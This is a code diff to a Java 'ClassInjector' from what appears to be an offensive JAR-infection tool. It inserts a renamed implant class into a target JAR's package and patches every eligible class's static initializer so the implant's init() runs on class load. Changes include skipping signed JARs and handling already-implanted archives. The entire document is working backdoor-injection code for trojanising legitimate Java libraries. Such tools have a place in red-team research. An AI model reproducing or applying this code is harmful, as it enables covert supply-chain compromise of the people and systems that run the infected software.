@@ -6,8 +6,11 @@ import java.io.DataInputStream;
 import java.io.IOException;
 import java.nio.ByteBuffer;
 import java.nio.ByteOrder;
+import java.nio.file.Files;
 import java.nio.file.Path;
+import java.nio.file.StandardCopyOption;
 import java.util.jar.JarEntry;
+import java.util.zip.ZipException;
 
 import static org.example.injector.Helpers.*;
 
@@ -21,22 +24,23 @@ public class ClassInjector {
 
     public boolean infect(final Path targetJarFilePath, Path outputJar) throws IOException {
         ClassFile implantedClass = null;
-        boolean foundSignedClasses = false;
+
+        if (jarLooksSigned(targetJarFilePath)) {
+            System.out.println("[-] JAR looks signed. This is not yet implemented. Aborting.");
+            // Just copy the input JAR to the output JAR to keep up with expected behaviour
+            Files.copy(targetJarFilePath, outputJar, StandardCopyOption.REPLACE_EXISTING);
+            return false;
+        }
 
         try (JarFileFiddler fiddler = JarFileFiddler.open(targetJarFilePath, outputJar)) {
             for (JarFileFiddler.WrappedJarEntry entry : fiddler) {
                 if (!entry.getName().endsWith(".class")) {
-                    entry.passOn();
+                    entry.forward();
                     continue;
                 }
-                if (entry.getEntry().getCodeSigners() != null) {
-                    foundSignedClasses = true;
-                    entry.passOn();
-                    continue;
-                }
-                if (entry.getName().equals(IMPLANT_CLASS_NAME + ".class")) {
-                    System.out.println("[-] WARNING: It looks like this JAR may already be infected. Proceeding anyway.");
-                    entry.passOn();
+                if (entry.getName().endsWith("/" + IMPLANT_CLASS_NAME + ".class") || entry.getName().equals(IMPLANT_CLASS_NAME + ".class")) {
+                    System.out.println("[-] Skipping class '" + entry.getName() + "' as it could be an already existing implant.");
+                    entry.forward();
                     continue;
                 }
 
@@ -54,8 +58,14 @@ public class ClassInjector {
                     ClassFile implant = implantHandler.loadFreshConfiguredSpecimen();
                     deepRenameClass(implant, targetPackageName, IMPLANT_CLASS_NAME);
                     JarEntry newJarEntry = convertToJarEntry(implant);
-                    implant.write(fiddler.addNewEntry(newJarEntry));
-                    System.out.println("[+] Wrote implant class '" + newJarEntry.getName() + "' to JAR file.");
+                    try {
+                        implant.write(fiddler.addNewEntry(newJarEntry));
+                        System.out.println("[+] Wrote implant class '" + newJarEntry.getName() + "' to JAR file.");
+                    } catch (ZipException e) {
+                        System.out.println("[-] Implant class may already exists in package '" + targetPackageName + "'. Aborting.");
+                        entry.forward();
+                        continue;   // TODO Signal these different endgames using exceptions instead
+                    }
 
                     implantedClass = implant;
                 }
@@ -69,19 +79,15 @@ public class ClassInjector {
                  * by an app.
                  */
                 modifyClinit(currentlyProcessing, implantedClass);
-                currentlyProcessing.write(entry.addAndGetStream());
+                currentlyProcessing.write(entry.replaceContentByStream());
                 System.out.println("[+] Modified class initializer for '" + currentlyProcessing.getName() + "'.");
-            }
-
-            if (foundSignedClasses) {
-                System.out.println("[-] Found signed classes. These were not considered for infection.");
             }
 
             return implantedClass != null;
         }
     }
 
-    private static void modifyClinit(ClassFile targetClass, ClassFile implantClass) {
+    static void modifyClinit(ClassFile targetClass, ClassFile implantClass) {
         MethodInfo implantInitMethod = implantClass.getMethod("init");
         if (implantInitMethod == null) {
             throw new UnsupportedOperationException("Implant class does not have a 'public static init()' function.");
@@ -110,10 +116,12 @@ public class ClassInjector {
         currentClinit.setCodeAttribute(newCodeAttribute);
     }
 
-    private static void deepRenameClass(ClassFile classFile, String newPackageName, String newClassName) {
+    // TODO This code is getting gnarly. Consider just stripping away debug info (for the implant class).
+    static void deepRenameClass(ClassFile classFile, String newPackageName, String newClassName) {
         String newFqcn = newPackageName + "." + newClassName;
         String newSourceFileName = newClassName + ".java";
 
+        boolean didChangeSomething = false;
         AttributeInfo sourceFileAttr = classFile.getAttribute(SourceFileAttribute.tag);
         if (sourceFileAttr != null) {
             ByteBuffer sourceFileInfo = ByteBuffer.wrap(sourceFileAttr.get());
@@ -127,6 +135,9 @@ public class ClassInjector {
             if (!fileName.startsWith(expectedName)) {
                 throw new RuntimeException("Unexpected SourceFileAttribute: Expected class to start with '" + expectedName + "'.");
             }
+            if (expectedName.equals(newClassName)) {
+                return; // Bad flow
+            }
             int newClassNameIndex = classFile.getConstPool().addUtf8Info(newSourceFileName);
             if (newClassNameIndex < 0 || newClassNameIndex > 65535) {
                 throw new RuntimeException("Unexpected index in ConstPool: " + newClassNameIndex);
@@ -134,9 +145,13 @@ public class ClassInjector {
             sourceFileInfo.flip();
             sourceFileInfo.putShort((short) newClassNameIndex);
             sourceFileAttr.set(sourceFileInfo.array());
+            didChangeSomething = true;
         }
 
         classFile.setName(newFqcn);
-        classFile.compact();
+        if (didChangeSomething) {
+            // compact() removes any "dead" items from the ConstPool. This modifies the class byte data quite a lot.
+            classFile.compact();
+        }
     }
 }
